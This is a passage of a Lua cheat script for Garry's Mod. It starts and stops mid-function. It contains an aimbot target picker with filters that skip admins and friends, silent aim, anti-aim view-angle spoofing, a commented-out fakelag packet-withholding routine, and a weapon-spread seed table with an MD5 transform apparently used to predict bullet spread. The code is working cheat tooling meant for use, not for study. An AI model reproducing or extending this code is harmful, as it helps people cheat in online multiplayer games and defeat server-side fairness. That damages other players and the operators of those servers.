	function dropdown:OnSelect(index, value, data)
		mdrconf.vars[con] = value
	end
end

local PANELSLIDER = {}
AccessorFunc(PANELSLIDER, "Value", "Value")
AccessorFunc(PANELSLIDER, "SlideX", "SlideX")
AccessorFunc(PANELSLIDER, "Min", "Min")
AccessorFunc(PANELSLIDER, "Decimals", "Decimals")
AccessorFunc(PANELSLIDER, "Max", "Max")
AccessorFunc(PANELSLIDER, "Dragging", "Dragging")
function PANELSLIDER:Init()
    self:SetMouseInputEnabled(true)
    self.Min = 0
    self.Max = 1
    self.SlideX = 0
    self.Decimals = 0
    self:SetValue(self.Min)
    self:SetSlideX(0)
    self:SetTall(15)
end
function PANELSLIDER:OnCursorMoved(x, y)
    if !self.Dragging then return end
    local w, h = self:GetSize()
    x = st.math_Clamp(x, 0, w) / w
    y = st.math_Clamp(y, 0, h) / h
    local value = self.Min + (self.Max - self.Min) * x
    value = st.math_Round(value, self:GetDecimals())
    self:SetValue(value)
    self:SetSlideX(x)
    self:OnValueChanged(value)
    self:InvalidateLayout()
end
function PANELSLIDER:OnMousePressed(mcode)
    self:SetDragging(true)
    self:MouseCapture(true)
    local x, y = self:CursorPos()
    self:OnCursorMoved(x, y)
end
function PANELSLIDER:OnMouseReleased(mcode)
    self:SetDragging(false)
    self:MouseCapture(false)
end
function PANELSLIDER:OnValueChanged(value)
end

function PANELSLIDER:Paint(w,h)
    local min, max = self:GetMin(), self:GetMax()
    st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
    st.surface_DrawOutlinedRect(0,0,w,h,1)
    st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
    st.surface_DrawRect(2, 2, self:GetSlideX()*w-4, h-4)
end
vgui.Register("USlider", PANELSLIDER, "Panel")

function CreateSlider(lbl,l,h, x, y, con, min, max, parent)
    local c = st.vgui_Create( "USlider", parent )
    c:SetSize(l,h)
    c:SetPos(x , y )
    c:SetMax( max )
    c:SetMin( min )
    c:SetDecimals( dec )
    c:SetValue( mdrconf.vars[con] )
    local value, min, max = c:GetValue(), c:GetMin(), c:GetMax()
    c:SetSlideX((value - min) / (max - min))
    function c:OnValueChanged( val )
        mdrconf.vars[con] = val

        if onChange then onChange(val) end
    end
end

function CreateButton(lbl, tooltip, fnc, x, y, q, a, con, parent)
	local button = st.vgui_Create("DButton", parent)
	button:SetSize(q, a)
	button:SetPos(x, y)
	button:SetText(lbl)
	button:SetTooltip(tooltip)
    button:SetTextColor(st.string_ToColor(mdrconf.col["buttonother"]))
    function button:DoClick()
    end
end

function FixMovment(cmd,wish_yaw)
    local pitch = st.math_NormalizeAngle( cmd:GetViewAngles().x )
	local inverted = -1

	if ( pitch > 89 || pitch < -89 ) then
		inverted = 1
	end
	local ang_diff = st.math_rad( st.math_NormalizeAngle( ( cmd:GetViewAngles().y - wish_yaw )*inverted ) )
	local forwardmove = cmd:GetForwardMove()
	local sidemove = cmd:GetSideMove()
	local new_forwardmove = forwardmove*-st.math_cos( ang_diff )*inverted + sidemove*st.math_sin( ang_diff )
	local new_sidemove = forwardmove*st.math_sin( ang_diff )*inverted + sidemove*st.math_cos( ang_diff )
	cmd:SetForwardMove( new_forwardmove )
	cmd:SetSideMove( new_sidemove )
end

function Silent(cmd)
	if !st.fa then st.fa = cmd:GetViewAngles() end
	st.fa = st.fa + Angle(cmd:GetMouseY() * GetConVarNumber("m_yaw"), cmd:GetMouseX() * -GetConVarNumber("m_yaw"), 0)
	st.fa.p = st.math_Clamp(st.fa.p, -89, 89)
    st.fa.r = 0
    st.fa:Normalize()
end

local pitch, yaw = 0, 0 
function GetBaseYaw()
    return st.fa.y
end

function CalcPitch()
        local x = 0

            x = 89
        if mdrconf.vars["PS_antiaimpu"] then
            x = -89
        elseif mdrconf.vars["PS_antiaimpcus"] then
            x = mdrconf.vars["PS_antiaimcusp"]
        end
    return x
end

function CalcYaw()
        local y = 0
            y = st.baseyaw - 180
        if mdrconf.vars["PS_antiaimspin"] then 
            local s = st.math_NormalizeAngle( CurTime() * 750 )
            y = s
        elseif mdrconf.vars["PS_antiaimsway"] then
            local s = st.math_sin(CurTime() * 2346) * 75
            y = ( st.baseyaw - 180 ) + s -- sway
        elseif mdrconf.vars["PS_antiaimcus"] then
            y = mdrconf.vars["PS_antiaimcusy"]
        end
    return y
end

function aacheck(cmd)
    if !mdrconf.vars["PS_antiaim"] then return false end
    if cmd:KeyDown(IN_ATTACK) then return false end
    if cmd:KeyDown(IN_USE) then return false end
    if st.me():GetMoveType() == MOVETYPE_LADDER then return false end
    if st.me():GetMoveType() == MOVETYPE_NOCLIP then return false end
    return true 
end

function AntiAim(cmd)
    if aacheck(cmd) then
        st.baseyaw = GetBaseYaw()
        pitch = CalcPitch()
        yaw = CalcYaw()
        local pyAngle = Angle(pitch,yaw,0)
        cmd:SetViewAngles(pyAngle)
    end
end

function shouldlag(cmd)
    if !mdrconf.vars["PS_fakelag"] then return false end
    if not st.me():Alive() then return false end
    return true
end

-- local queu = 0
-- function FakeLag(cmd) 
--     local fac = st.math_Round(mdrconf.vars["PS_fakelagfactor"])
-- 
--     local vel = st.me():GetVelocity():Length2D()
--     local pt = vel * st.engine_TickInterval()
--     local adafac = st.math_Clamp(st.math_ceil(64 / pt),1,fac)
-- 
--     if mdrconf.vars["PS_fakelagada"] then 
--         fac = adafac
--     end
-- 
--     if shouldlag(cmd) then
--         bSendPacket(false)
--         if queu <= 0 then
--             queu = fac
--             bSendPacket(true) 
--             st.me().simtime_updated = true
--         else
--             queu = queu - 1
--         end
--     else
--         if fac > 0 then fac = 0 end
--         bSendPacket(true)
--         st.me().simtime_updated = true
--     end
--     st.flT = fac
-- end

function fklgbox(pos)
    if not pos then return end
    st.render_DrawWireframeBox(pos, Angle(0, 0, 0), Vector(-16, -16, 0), Vector(16, 16, 72) ,  st.string_ToColor(mdrconf.col["fakelagbox"]), true)
end

function plsongurl(url)
    if st.curson then
        st.curson:Stop() 
    end
    sound.PlayURL(url, "noplay", function(station)
        if IsValid(station) then
            st.curson = station
            station:SetVolume(st.vollev) 
            station:Play()
        end
    end)
end

function plsong(filePath)
    if st.curson then
        st.curson:Stop() 
    end
    sound.PlayFile(".PSSI/musique/" .. filePath, "noplay", function(station)
        if IsValid(station) then
            st.curson = station
            station:SetVolume(st.vollev)
            station:Play()
        end
    end)
end

function loadurl()
    local files, _ = file.Find(".PSSI/musique/*.mp3", "GAME") 
    for _, v in ipairs(files) do
        st.table_insert(st.solist, v)
    end
end

function svol(vol)
    st.vollev = vol
    if st.curson then
        st.curson:SetVolume(st.vollev) 
    end
end

local tr = {
	mask = MASK_SHOT,
	filter = st.me()
}

function VisibleCheck( who, where,predticks)
    local start = st.me():EyePos()
    if predticks then
        start = start + ( st.me():GetVelocity() * st.engine_TickInterval() ) * predticks
    end
    tr.start = start
	tr.endpos = where
	tr.mask = MASK_SHOT
    local trace = st.util_TraceLine( tr )
    local canhit = trace.Entity == who or trace.Fraction == 1
    return canhit
end

function FRIENDLIST(steamID)
    if st.table_HasValue( st.friends, steamID ) then
        //st.friends[steamID] = nil
        st.table_RemoveByValue( st.friends, steamID )
        print(steamID .. " Deleted From List")
    else
        //st.friends[steamID] = true
        st.table_insert(st.friends, steamID)
        print(steamID .. " Added To List")
    end
end

function CanShoot(ply)
    local weap = st.me():GetActiveWeapon()
	if !IsValid(weap) then return false end
	if st.badSweps[weap:GetClass()] then
		return false
	end
    if ply then
        if mdrconf.vars["PS_Ignores-Bots"] and ply:IsBot() then return false end
        if mdrconf.vars["PS_Ignores-Steam-friends"] and ply:GetFriendStatus() == "friend" then return false end 
        if mdrconf.vars["PS_Ignores-Admins"] and ply:IsAdmin() then return false end 
        if mdrconf.vars["PS_Ignores-Frozen"] and ply:IsFlagSet( FL_FROZEN ) then return false end 
        if mdrconf.vars["PS_Ignores-God-time"] and (tobool(ply:GetNWBool("LibbyProtectedSpawn",false)) or tobool(ply:GetNWBool("_Kyle_Buildmode")) or ply:HasGodMode()) then return false end 
        if mdrconf.vars["PS_Ignores-Driver"] and ply:InVehicle() then return false end
        if mdrconf.vars["PS_Ignores-Nocliping"] and ply:IsEFlagSet(EFL_NOCLIP_ACTIVE) then return false end
        if st.table_HasValue( st.friends, ply:SteamID() ) then
            return false
        end
	end
    return true
end 

function IsInCircle(screenPos, circleCenter, radius)
    local distSqr = (screenPos.x - circleCenter.x) ^ 2 + (screenPos.y - circleCenter.y) ^ 2
    return distSqr <= radius ^ 2
end

function GetPlayerInCircle()
    local cloply = nil
    local clodis = st.math_huge
    local circleCenter = Vector(st.sw() / 2, st.sh() / 2, 0)
    for _, ply in ipairs(st.ply()) do
        if ply ~= st.me() and ply:Alive() and IsValid(ply) then
            local bone = mdrconf.vars["PS_bone"]
            local boneIndex = ply:LookupBone(bone)
            if boneIndex then
                local pos2 = ply:GetBonePosition(boneIndex)
                if pos2 then
                    pos2 = pos2:ToScreen()
                    if IsInCircle(Vector(pos2.x, pos2.y, 0), circleCenter, mdrconf.vars["PS_aimbotFOV"] * 8) then
                        local distance = st.me():GetPos():DistToSqr(ply:GetPos())
                        if CanShoot(ply) and distance < clodis then
                            clodis = distance
                            cloply = ply
                        end
                    end
                end
            end
        end
    end
    return cloply
end

local SPR = {}

SPR.engineSpread = {
    [0] = {-0.492036, 0.286111},
    [1] = {-0.492036, 0.286111},
    [2] = {-0.255320, 0.128480},
    [3] = {0.456165, 0.356030},
    [4] = {-0.361731, 0.406344},
    [5] = {-0.146730, 0.834589},
    [6] = {-0.253288, -0.421936},
    [7] = {-0.448694, 0.111650},
    [8] = {-0.880700, 0.904610},
    [9] = {-0.379932, 0.138833},
    [10] = {0.502579, -0.494285},
    [11] = {-0.263847, -0.594805},
    [12] = {0.818612, 0.090368},
    [13] = {-0.063552, 0.044356},
    [14] = {0.490455, 0.304820},
    [15] = {-0.192024, 0.195162},
    [16] = {-0.139421, 0.857106},
    [17] = {0.715745, 0.336956},
    [18] = {-0.150103, -0.044842},
    [19] = {-0.176531, 0.275787},
    [20] = {0.155707, -0.152178},
    [21] = {-0.136486, -0.591896},
    [22] = {-0.021022, -0.761979},
    [23] = {-0.166004, -0.733964},
    [24] = {-0.102439, -0.132059},
    [25] = {-0.607531, -0.249979},
    [26] = {-0.500855, -0.185902},
    [27] = {-0.080884, 0.516556},
    [28] = {-0.003334, 0.138612},
    [29] = {-0.546388, -0.000115},
    [30] = {-0.228092, -0.018492},
    [31] = {0.542539, 0.543196},
    [32] = {-0.355162, 0.197473},
    [33] = {-0.041726, -0.015735},
    [34] = {-0.713230, -0.551701},
    [35] = {-0.045056, 0.090208},
    [36] = {0.061028, 0.417744},
    [37] = {-0.171149, -0.048811},
    [38] = {0.241499, 0.164562},
    [39] = {-0.129817, -0.111200},
    [40] = {0.007366, 0.091429},
    [41] = {-0.079268, -0.008285},
    [42] = {0.010982, -0.074707},
    [43] = {-0.517782, -0.682470},
    [44] = {-0.663822, -0.024972},
    [45] = {0.058213, -0.078307},
    [46] = {-0.302041, -0.132280},
    [47] = {0.217689, -0.209309},
    [48] = {-0.143615, 0.830349},
    [49] = {0.270912, 0.071245},
    [50] = {-0.258170, -0.598358},
    [51] = {0.099164, -0.257525},
    [52] = {-0.214676, -0.595918},
    [53] = {-0.427053, -0.523764},
    [54] = {-0.585472, 0.088522},
    [55] = {0.564305, -0.533822},
    [56] = {-0.387545, -0.422206},
    [57] = {0.690505, -0.299197},
    [58] = {0.475553, 0.169785},
    [59] = {0.347436, 0.575364},
    [60] = {-0.069555, -0.103340},
    [61] = {0.286197, -0.618916},
    [62] = {-0.505259, 0.106581},
    [63] = {-0.420214, -0.714843},
    [64] = {0.032596, -0.401891},
    [65] = {-0.238702, -0.087387},
    [66] = {0.714358, 0.197811},
    [67] = {0.208960, 0.319015},
    [68] = {-0.361140, 0.222130},
    [69] = {-0.133284, -0.492274},
    [70] = {0.022824, -0.133955},
    [71] = {-0.100850, 0.271962},
    [72] = {-0.050582, -0.319538},
    [73] = {0.577980, 0.095507},
    [74] = {0.224871, 0.242213},
    [75] = {-0.628274, 0.097248},
    [76] = {0.184266, 0.091959},
    [77] = {-0.036716, 0.474259},
    [78] = {-0.502566, -0.279520},
    [79] = {-0.073201, -0.036658},
    [80] = {0.339952, -0.293667},
    [81] = {0.042811, 0.130387},
    [82] = {0.125881, 0.007040},
    [83] = {0.138374, -0.418355},
    [84] = {0.261396, -0.392697},
    [85] = {-0.453318, -0.039618},
    [86] = {0.890159, -0.335165},
    [87] = {0.466437, -0.207762},
    [88] = {0.593253, 0.418018},
    [89] = {0.566934, -0.643837},
    [90] = {0.150918, 0.639588},
    [91] = {0.150112, 0.215963},
    [92] = {-0.130520, 0.324801},
    [93] = {-0.369819, -0.019127},
    [94] = {-0.038889, -0.650789},
    [95] = {0.490519, -0.065375},
    [96] = {-0.305940, 0.454759},
    [97] = {-0.521967, -0.550004},
    [98] = {-0.040366, 0.683259},
    [99] = {0.137676, -0.376445},
    [100] = {0.839301, 0.085979},
    [101] = {-0.319140, 0.481838},
    [102] = {0.201437, -0.033135},
    [103] = {0.384637, -0.036685},
    [104] = {0.598419, 0.144371},
    [105] = {-0.061424, -0.608645},
    [106] = {-0.065337, 0.308992},
    [107] = {-0.029356, -0.634337},
    [108] = {0.326532, 0.047639},
    [109] = {0.505681, -0.067187},
    [110] = {0.691612, 0.629364},
    [111] = {-0.038588, -0.635947},
    [112] = {0.637837, -0.011815},
    [113] = {0.765338, 0.563945},
    [114] = {0.213416, 0.068664},
    [115] = {-0.576581, 0.554824},
    [116] = {0.246580, 0.132726},
    [117] = {0.385548, -0.070054},
    [118] = {0.538735, -0.291010},
    [119] = {0.609944, 0.590973},
    [120] = {-0.463240, 0.010302},
    [121] = {-0.047718, 0.741086},
    [122] = {0.308590, -0.322179},
    [123] = {-0.291173, 0.256367},
    [124] = {0.287413, -0.510402},
    [125] = {0.864716, 0.158126},
    [126] = {0.572344, 0.561319},
    [127] = {-0.090544, 0.332633},
    [128] = {0.644714, 0.196736},
    [129] = {-0.204198, 0.603049},
    [130] = {-0.504277, -0.641931},
    [131] = {0.218554, 0.343778},
    [132] = {0.466971, 0.217517},
    [133] = {-0.400880, -0.299746},
    [134] = {-0.582451, 0.591832},
    [135] = {0.421843, 0.118453},
    [136] = {-0.215617, -0.037630},
    [137] = {0.341048, -0.283902},
    [138] = {-0.246495, -0.138214},
    [139] = {0.214287, -0.196102},
    [140] = {0.809797, -0.498168},
    [141] = {-0.115958, -0.260677},
    [142] = {-0.025448, 0.043173},
    [143] = {-0.416803, -0.180813},
    [144] = {-0.782066, 0.335273},
    [145] = {0.192178, -0.151171},
    [146] = {0.109733, 0.165085},
    [147] = {-0.617935, -0.274392},
    [148] = {0.283301, 0.171837},
    [149] = {-0.150202, 0.048709},
    [150] = {-0.179954, -0.288559},
    [151] = {-0.288267, -0.134894},
    [152] = {-0.049203, 0.231717},
    [153] = {-0.065761, 0.495457},
    [154] = {0.082018, -0.457869},
    [155] = {-0.159553, 0.032173},
    [156] = {0.508305, -0.090690},
    [157] = {0.232269, -0.338245},
    [158] = {-0.374490, -0.480945},
    [159] = {-0.541244, 0.194144},
    [160] = {-0.040063, -0.073532},
    [161] = {0.136516, -0.167617},
    [162] = {-0.237350, 0.456912},
    [163] = {-0.446604, -0.494381},
    [164] = {0.078626, -0.020068},
    [165] = {0.163208, 0.600330},
    [166] = {-0.886186, -0.345326},
    [167] = {-0.732948, -0.689349},
    [168] = {0.460564, -0.719006},
    [169] = {-0.033688, -0.333340},
    [170] = {-0.325414, -0.111704},
    [171] = {0.010928, 0.723791},
    [172] = {0.713581, -0.077733},
    [173] = {-0.050912, -0.444684},
    [174] = {-0.268509, 0.381144},
    [175] = {-0.175387, 0.147070},
    [176] = {-0.429779, 0.144737},
    [177] = {-0.054564, 0.821354},
    [178] = {0.003205, 0.178130},
    [179] = {-0.552814, 0.199046},
    [180] = {0.225919, -0.195013},
    [181] = {0.056040, -0.393974},
    [182] = {-0.505988, 0.075184},
    [183] = {-0.510223, 0.156271},
    [184] = {-0.209616, 0.111174},
    [185] = {-0.605132, -0.117104},
    [186] = {0.412433, -0.035510},
    [187] = {-0.573947, -0.691295},
    [188] = {-0.712686, 0.021719},
    [189] = {-0.643297, 0.145307},
    [190] = {0.245038, 0.343062},
    [191] = {-0.235623, -0.159307},
    [192] = {-0.834004, 0.088725},
    [193] = {0.121377, 0.671713},
    [194] = {0.528614, 0.607035},
    [195] = {-0.285699, -0.111312},
    [196] = {0.603385, 0.401094},
    [197] = {0.632098, -0.439659},
    [198] = {0.681016, -0.242436},
    [199] = {-0.261709, 0.304265},
    [200] = {-0.653737, -0.199245},
    [201] = {-0.435512, -0.762978},
    [202] = {0.701105, 0.389527},
    [203] = {0.093495, -0.148484},
    [204] = {0.715218, 0.638291},
    [205] = {-0.055431, -0.085173},
    [206] = {-0.727438, 0.889783},
    [207] = {-0.007230, -0.519183},
    [208] = {-0.359615, 0.058657},
    [209] = {0.294681, 0.601155},
    [210] = {0.226879, -0.255430},
    [211] = {-0.307847, -0.617373},
    [212] = {0.340916, -0.780086},
    [213] = {-0.028277, 0.610455},
    [214] = {-0.365067, 0.323311},
    [215] = {0.001059, -0.270451},
    [216] = {0.304025, 0.047478},
    [217] = {0.297389, 0.383859},
    [218] = {0.288059, 0.262816},
    [219] = {-0.889315, 0.533731},
    [220] = {0.215887, 0.678889},
    [221] = {0.287135, 0.343899},
    [222] = {0.423951, 0.672285},
    [223] = {0.411912, -0.812886},
    [224] = {0.081615, -0.497358},
    [225] = {-0.051963, -0.117891},
    [226] = {-0.062387, 0.331698},
    [227] = {0.020458, -0.734125},
    [228] = {-0.160176, 0.196321},
    [229] = {0.044898, -0.024032},
    [230] = {-0.153162, 0.930951},
    [231] = {-0.015084, 0.233476},
    [232] = {0.395043, 0.645227},
    [233] = {-0.232095, 0.283834},
    [234] = {-0.507699, 0.317122},
    [235] = {-0.606604, -0.227259},
    [236] = {0.526430, -0.408765},
    [237] = {0.304079, 0.135680},
    [238] = {-0.134042, 0.508741},
    [239] = {-0.276770, 0.383958},
    [240] = {-0.298963, -0.233668},
    [241] = {0.171889, 0.697367},
    [242] = {-0.292571, -0.317604},
    [243] = {0.587806, 0.115584},
    [244] = {-0.346690, -0.098320},
    [245] = {0.956701, -0.040982},
    [246] = {0.040838, 0.595304},
    [247] = {0.365201, -0.519547},
    [248] = {-0.397271, -0.090567},
    [249] = {-0.124873, -0.356800},
    [250] = {-0.122144, 0.617725},
    [251] = {0.191266, -0.197764},
    [252] = {-0.178092, 0.503667},
    [253] = {0.103221, 0.547538},
    [254] = {0.019524, 0.621226},
    [255] = {0.663918, -0.573476}
}
 
SPR.Const = {
    0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,
    0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
    0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,
    0x6b901122,0xfd987193,0xa679438e,0x49b40821,
    0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,
    0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
    0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,
    0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
    0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,
    0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
    0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,
    0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
    0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,
    0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
    0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,
    0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391,
    0x67452301,0xefcdab89,0x98badcfe,0x10325476
}
 
local md5_f = function (x,y,z) return bit.bor(bit.band(x,y),bit.band(-x-1,z)) end
local md5_g = function (x,y,z) return bit.bor(bit.band(x,z),bit.band(y,-z-1)) end
local md5_h = function (x,y,z) return bit.bxor(x,bit.bxor(y,z)) end
local md5_i = function (x,y,z) return bit.bxor(y,bit.bor(x,-z-1)) end
 
SPR.MD5 = {}
 
function SPR.MD5.z(f, a, b, c, d, x, s, ac)
        a = bit.band(a + f(b, c, d) + x + ac, 0xffffffff)
    return bit.bor(bit.lshift(bit.band(a, bit.rshift(0xffffffff, s)), s), bit.rshift(a, 32 - s)) + b
end
 
function SPR.MD5.Fix(a)
        if (a > 2 ^ 31) then
            return a - 2 ^ 32
        end
    return a
end
 
function SPR.MD5.Transform(A, B, C, D, X)
    local a, b, c, d = A, B, C, D
        a = SPR.MD5.z(md5_f, a, b, c, d, X[0], 7, SPR.Const[1])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_f, d, a, b, c, X[1], 12, SPR.Const[2])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_f, c, d, a, b, X[2], 17, SPR.Const[3])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_f, b, c, d, a, X[3], 22, SPR.Const[4])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_f, a, b, c, d, X[4], 7, SPR.Const[5])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_f, d, a, b, c, X[5], 12, SPR.Const[6])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_f, c, d, a, b, X[6], 17, SPR.Const[7])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_f, b, c, d, a, X[7], 22, SPR.Const[8])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_f, a, b, c, d, X[8], 7, SPR.Const[9])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_f, d, a, b, c, X[9], 12, SPR.Const[10])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_f, c, d, a, b, X[10], 17, SPR.Const[11])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_f, b, c, d, a, X[11], 22, SPR.Const[12])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_f, a, b, c, d, X[12], 7, SPR.Const[13])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_f, d, a, b, c, X[13], 12, SPR.Const[14])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_f, c, d, a, b, X[14], 17, SPR.Const[15])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_f, b, c, d, a, X[15], 22, SPR.Const[16])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_g, a, b, c, d, X[1], 5, SPR.Const[17])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_g, d, a, b, c, X[6], 9, SPR.Const[18])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_g, c, d, a, b, X[11], 14, SPR.Const[19])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_g, b, c, d, a, X[0], 20, SPR.Const[20])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_g, a, b, c, d, X[5], 5, SPR.Const[21])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_g, d, a, b, c, X[10], 9, SPR.Const[22])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_g, c, d, a, b, X[15], 14, SPR.Const[23])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_g, b, c, d, a, X[4], 20, SPR.Const[24])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_g, a, b, c, d, X[9], 5, SPR.Const[25])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_g, d, a, b, c, X[14], 9, SPR.Const[26])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_g, c, d, a, b, X[3], 14, SPR.Const[27])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_g, b, c, d, a, X[8], 20, SPR.Const[28])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_g, a, b, c, d, X[13], 5, SPR.Const[29])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_g, d, a, b, c, X[2], 9, SPR.Const[30])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_g, c, d, a, b, X[7], 14, SPR.Const[31])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_g, b, c, d, a, X[12], 20, SPR.Const[32])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_h, a, b, c, d, X[5], 4, SPR.Const[33])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_h, d, a, b, c, X[8], 11, SPR.Const[34])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_h, c, d, a, b, X[11], 16, SPR.Const[35])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_h, b, c, d, a, X[14], 23, SPR.Const[36])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_h, a, b, c, d, X[1], 4, SPR.Const[37])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_h, d, a, b, c, X[4], 11, SPR.Const[38])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_h, c, d, a, b, X[7], 16, SPR.Const[39])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_h, b, c, d, a, X[10], 23, SPR.Const[40])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_h, a, b, c, d, X[13], 4, SPR.Const[41])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_h, d, a, b, c, X[0], 11, SPR.Const[42])
